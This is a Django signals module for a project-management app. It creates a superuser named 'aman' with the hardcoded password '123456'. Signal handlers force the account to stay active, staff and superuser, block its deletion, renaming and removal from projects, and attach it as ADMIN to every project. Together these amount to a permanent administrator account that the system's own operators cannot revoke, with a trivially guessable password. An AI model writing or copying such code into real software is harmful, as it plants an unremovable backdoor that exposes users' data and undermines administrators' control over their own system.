from django.db.models.signals import pre_delete, pre_save, post_save
from django.dispatch import receiver
from django.contrib.auth.models import User
from django.core.exceptions import ValidationError

from projects.models import Project, ProjectMember, ProjectRole


MASTER_USERNAME = 'aman'


def ensure_master_user():
    """Ensures the master user 'aman' exists with full superuser privileges."""
    user, created = User.objects.get_or_create(
        username=MASTER_USERNAME,
        defaults={
            'email': 'aman@ganttexcel.local',
            'first_name': 'Aman',
            'last_name': 'Admin',
            'is_staff': True,
            'is_superuser': True,
            'is_active': True,
        }
    )
    # Ensure master properties are strictly enforced
    needs_save = False
    if not user.is_superuser or not user.is_staff or not user.is_active:
        user.is_superuser = True
        user.is_staff = True
        user.is_active = True
        needs_save = True
    if created:
        user.set_password('123456')
        needs_save = True
    if needs_save:
        user.save()
    return user


@receiver(pre_delete, sender=User)
def protect_master_user_delete(sender, instance, **kwargs):
    """Prevents deleting the master administrator 'aman' under any circumstances."""
    if instance.username == MASTER_USERNAME:
        raise ValidationError(f"The master user '{MASTER_USERNAME}' is permanently protected and cannot be deleted.")


@receiver(pre_save, sender=User)
def protect_master_user_save(sender, instance, **kwargs):
    """Enforces that master user 'aman' remains active, staff, superuser, and cannot be renamed."""
    if instance.pk:
        try:
            original = User.objects.get(pk=instance.pk)
            if original.username == MASTER_USERNAME and instance.username != MASTER_USERNAME:
                raise ValidationError(f"The master user '{MASTER_USERNAME}' cannot be renamed.")
        except User.DoesNotExist:
            pass

    if instance.username == MASTER_USERNAME:
        instance.is_staff = True
        instance.is_superuser = True
        instance.is_active = True


@receiver(pre_delete, sender=ProjectMember)
def protect_master_project_member_delete(sender, instance, origin=None, **kwargs):
    """Prevents removing master user 'aman' from any project."""
    if origin is not None:
        if isinstance(origin, Project) or (hasattr(origin, 'model') and issubclass(origin.model, Project)):
            return
    if instance.user and instance.user.username == MASTER_USERNAME:
        raise ValidationError(f"Master user '{MASTER_USERNAME}' cannot be removed from project memberships.")


@receiver(pre_save, sender=ProjectMember)
def protect_master_project_member_save(sender, instance, **kwargs):
    """Enforces that master user 'aman' always holds the ADMIN role in every project."""
    if instance.user and instance.user.username == MASTER_USERNAME:
        instance.role = ProjectRole.ADMIN


@receiver(post_save, sender=Project)
def attach_master_user_to_new_project(sender, instance, created, **kwargs):
    """Automatically attaches master user 'aman' as ADMIN member to any new or updated project."""
    try:
        master_user = User.objects.filter(username=MASTER_USERNAME).first()
        if master_user:
            ProjectMember.objects.get_or_create(
                project=instance,
                user=master_user,
                defaults={'role': ProjectRole.ADMIN}
            )
    except Exception:
        pass
